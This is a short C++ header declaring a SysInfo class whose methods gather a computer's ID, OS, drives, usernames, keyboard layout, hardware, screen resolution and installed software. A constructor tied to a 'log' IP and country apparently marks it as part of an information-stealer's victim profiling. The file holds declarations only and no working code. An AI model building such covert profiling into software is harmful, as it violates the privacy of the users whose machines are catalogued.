#pragma once
struct OsVer 
{
	DWORD dwMajor;
	DWORD dwMinor;
	DWORD dwBuild;
	BOOL isX64;
};

class SysInfo
{
private:
	string ip, country;

	void __cpuid(int CPUInfo[4], int InfoType);
public:
	SysInfo() {};
	SysInfo(string& log_ip, string& log_country)
	{
		ip = log_ip;
		country = log_country;
	}

	string GetUid();
	string GetUtcTime();
	OsVer GetOsVer();
	string GetOs();
	string GetDrives();
	string GetUsername();
	string GetComputername();
	string GetUsers();
	string GetKeyboard();
	string GetCpu();
	string GetCpuKernels();
	string GetGpu();
	string GetRam();
	string GetResolution();
	string GetInstalledSoftware();
	string BuildInfo();
};